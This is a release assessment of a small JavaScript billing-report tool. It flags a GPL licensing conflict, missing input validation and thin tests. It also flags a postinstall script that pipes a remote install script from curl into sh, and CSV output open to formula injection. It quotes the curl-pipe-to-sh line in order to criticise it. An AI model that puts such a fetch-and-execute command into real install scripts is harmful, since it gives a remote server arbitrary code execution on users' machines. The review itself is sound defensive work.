# Billing report release assessment

## Verdict

**Do not ship the next commercial release yet.** The tool has one confirmed
licensing/compliance blocker and one confirmed installation supply-chain
blocker. Its CSV output is also not safe for general finance data, and the
current test suite is too narrow to support a commercial release.

## Findings

### 1. High — vendored code conflicts with the product's stated licensing

`vendor/quicksort-plus.js` identifies itself as `quicksort-plus v0.4.1` and
includes the GNU GPL redistribution terms. `src/report.js` imports and uses
that code, while `README.md` says that no third-party code is bundled and the
product is proprietary. Those statements cannot be treated as verified until
the dependency's provenance, exact GPL obligations, and the commercial
distribution model are reviewed by the appropriate legal/compliance owner.

Release action: either replace it with an independently authored, documented
implementation or complete a formal GPL compatibility review and ship all
required notices/source obligations. Update the README to reflect reality.

### 2. High — install executes mutable remote shell code

`scripts/postinstall.sh` runs:

```sh
curl -fsSL https://tables.example.com/latest/install.sh | sh
```

This gives the remote server arbitrary code execution on every install, uses a
mutable `latest` artifact, and makes installation depend on network availability
and DNS/TLS/service integrity. The script's comment says it pulls tax tables,
but the repository contains no verification, pinning, checksum/signature check,
or documented destination/behavior for those tables. This is a serious supply
chain and reproducibility risk for a finance-related commercial tool.

Release action: remove the remote shell pipeline. If tax data is required,
obtain a versioned artifact through a controlled release process, verify its
integrity and provenance, and make installation deterministic and auditable.

### 3. High — output is not valid general-purpose CSV

`buildReport` directly interpolates `name` and `total` with a comma separator;
it does not quote or escape CSV fields. A customer name containing a comma,
quote, or newline changes the record structure. Names beginning with `=`, `+`,
`-`, or `@` can also become spreadsheet formula cells when the CSV is opened in
common office software. This is both a correctness issue and a potential CSV
injection issue for finance workflows.

Release action: use a standards-compliant CSV serializer or implement field
quoting/escaping, define an explicit policy for formula-like values, and add
tests for commas, quotes, newlines, empty values, Unicode, and large values.

### 4. Medium — input validation and error behavior are unspecified

There is no validation of `rows`, row shape, customer name, or numeric total.
Observed behavior includes `A,undefined` for a missing total and `A,NaN` for a
`NaN` total; `null` input throws a raw `TypeError`. The sorter compares values
using JavaScript relational coercion, so mixed types and invalid numbers can
produce surprising ordering rather than a controlled failure.

Release action: define the input contract, reject malformed rows and non-finite
totals with actionable errors, and decide how empty input, null-like names,
duplicate customers, negative totals, and decimal precision are handled.

### 5. Medium — release assurance and maintainability are weak

The only automated test covers two valid rows and ascending order. There are no
tests for CSV correctness, validation, immutability, empty input, error
handling, security-sensitive values, installation behavior, or licensing and
packaging checks. There is also no lockfile in the workspace, so dependency or
tooling resolution is not captured for reproducible builds (although the
runtime code currently has no package dependency).

Release action: expand unit and integration coverage around the defined
contract; add a clean-install/packaging check that does not execute unreviewed
network code; and add CI checks for license inventory, artifact contents, and
reproducibility.

## Positive observations

- The implementation copies the input array before sorting, so the supplied
  array is not reordered as a side effect.
- The current happy-path test passes, and sorting is ascending for comparable
  numeric totals.
- The runtime implementation is small and easy to isolate behind a stricter
  input/output contract.

## Verification performed

Reviewed `README.md`, `package.json`, `src/report.js`,
`vendor/quicksort-plus.js`, `scripts/postinstall.sh`, and
`test/report.test.js`. Ran `npm test` successfully (1 test passed). Exercised
comma, quote, newline, formula-like, missing-total, `NaN`, and null-input
cases directly; the unsafe/malformed outputs and raw null-input exception
described above were reproduced. No source code was changed.
